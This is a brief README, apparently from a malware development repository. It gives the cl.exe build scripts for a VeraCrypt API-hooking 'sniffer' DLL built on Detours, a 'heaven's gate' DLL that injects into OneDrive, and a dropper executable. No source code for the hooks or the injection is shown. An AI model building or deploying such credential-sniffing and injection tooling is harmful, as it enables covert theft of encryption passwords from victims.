# Onedrive_Veracrypt_api_hooking
malware development

![all_together](./all_together.png)

## vcsniff api hooking (Detours required reflective DLL)
```
@ECHO OFF

cl.exe /nologo /W0 vcsniff.cpp /MT /link /DLL detours\lib.X64\detours.lib /OUT:vcsniff_detours.dll

del *.obj *.lib *.exp
```
## heaven gates dll (OneDrive injector reflective DLL) 

```
@ECHO OFF

cl.exe /nologo /W0 dll_heavens_gates.cpp /MT /link /DLL  /OUT:heavens_gates.dll

del *.obj *.lib *.exp
```

## Dropper

```
@ECHO OFF

cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp *.cpp /link /OUT:launcher.exe /SUBSYSTEM:CONSOLE 

del *.obj
```
